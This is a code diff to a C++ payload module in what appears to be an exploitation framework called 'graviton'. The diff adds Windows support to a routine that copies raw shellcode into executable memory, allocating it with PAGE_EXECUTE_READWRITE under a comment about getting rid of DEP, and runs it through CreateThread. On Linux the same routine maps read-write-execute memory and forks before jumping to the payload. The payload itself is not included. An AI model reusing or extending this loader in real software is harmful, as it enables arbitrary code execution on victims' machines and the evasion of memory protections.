@@ -27,7 +27,7 @@
 #ifndef _GVN_PAYLOAD_HEAD_
 #define _GVN_PAYLOAD_HEAD_
 
-#include "../graviton.hpp"
+#include <graviton.hpp>
 
 #if defined(INFO_OS_LINUX)
     #include <sys/mman.h>
@@ -38,6 +38,8 @@
 #elif defined(INFO_OS_OSX)
     #include <sys/mman.h>
     #include <errno.h>
+#elif defined(INFO_OS_WINDOWS)
+    #include <WinBase.h>
 #endif
 
 #include <string>
@@ -145,21 +147,46 @@ bool Binary_Payload::run()
 {
     /// Copy payload to heap
 #if defined(INFO_OS_LINUX)
-    /// Copy payload to heap and set RWX permisson
-    // jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
+    /// Copy payload to heap and set RWX permissons
+    // jumper = ( void ( * ) ( void* ) ) malloc ( payload_size + 4069);
     /// During my linux tests, I discoverd that mmap is better than mprotect
-    jumper = ( void ( * ) ( void* ) ) mmap( 0, payload_size,
+    jumper = ( void ( * ) ( void* ) ) mmap( 0, payload_size + 4069,
                                             PROT_READ | PROT_WRITE | PROT_EXEC,
                                             MAP_SHARED | MAP_ANONYMOUS,
                                             -1, 0 );
 
-    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );
+    memcpy ( ( void* ) jumper, ( void * ) payload, (payload_size) * sizeof ( unsigned char ) );
+#elif defined(INFO_OS_WINDOWS)
+    /// Get rid of DEP
+    /// "How about I give you my middle finger, and you give me my phone call(Executable Heap)" - Neo
+    jumper = (void(*)(void*))
+            VirtualAllocEx(
+                GetCurrentProcess(),
+                NULL,
+                payload_size  + 4069,
+                MEM_COMMIT,
+                PAGE_EXECUTE_READWRITE);
+
+    if( WriteProcessMemory(
+                GetCurrentProcess(),
+                (LPVOID)jumper,
+                (LPVOID)payload,
+                (DWORD)payload_size,
+                NULL)
+            == FALSE )
+    {
+        Core::Logger::logVariable("WriteProcessMemory Failed", GetLastError());
+        return false;
+    }
 #else
     /// Set jumper address
-    jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
-    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );
+    jumper = ( void ( * ) ( void* ) ) malloc ( payload_size + 4069 );
+    memcpy ( ( void* ) jumper, ( void * ) payload, (payload_size) * sizeof ( unsigned char ) );
 #endif
 
+    /// Forking
+    /// @todo check if osx needs fork
+    /// @todo ARM
 #if defined(INFO_OS_LINUX)
     /// Fork
     Core::Logger::logItLn ("Forking...");
@@ -169,7 +196,6 @@ bool Binary_Payload::run()
     if ( pid == 0 )
     {
 #endif
-
         /// Setting Heap RWX Permissions
 #if defined(INFO_OS_LINUX)
         /// Noithing!
@@ -183,8 +209,6 @@ bool Binary_Payload::run()
 
             return false;
         }
-#elif defined(INFO_OS_WINDOWS)
-/// @todo: disable DEP @ runtime
 #endif
         /// A Little OS Independent Delay!
         int _delay = 320;
@@ -193,12 +217,18 @@ bool Binary_Payload::run()
             --_delay;
         }
 
-        /// Jumping to starting address of payload
+        /// Jump to payload
 
 #if defined(INFO_CPU_X64)
-        Core::Logger::logItLn ( "Jumping on Payload (64bit)..." );
+        Core::Logger::logItLn ( "Jumping to Payload (64bit)..." );
+#if defined(INFO_OS_WINDOWS)
+        /// Cool!
+        HANDLE trd = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)jumper, NULL, 0, NULL);
+        WaitForSingleObject(trd, INFINITE);
+#else
         jumper(_null_);
-
+#endif
+        /// Old technique
         /*
         int useless_out = 0;
         asm (
@@ -210,9 +240,15 @@ bool Binary_Payload::run()
         );
         */
 #elif defined(INFO_CPU_X86)
-        Core::Logger::logItLn ( "Jumping on Payload (32bit)..." );
+        Core::Logger::logItLn ( "Jumping to Payload (32bit)..." );
+#if defined(INFO_OS_WINDOWS)
+        /// Cool!
+        HANDLE trd = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)jumper, NULL, 0, NULL);
+        WaitForSingleObject(trd, INFINITE);
+#else
         jumper(_null_);
-
+#endif
+        /// Old technique
         /*
         int useless_out = 0;
         asm (
@@ -224,11 +260,9 @@ bool Binary_Payload::run()
         );
         */
 #else
-        Core::Logger::logItLn ( "Jumping on Payload (unk)..." );
+        Core::Logger::logItLn ( "Jumping to Payload (unk)..." );
         jumper(_null_);
 #endif
-
-/// @todo ARM
 
 #if defined(INFO_OS_LINUX)
         exit(0);
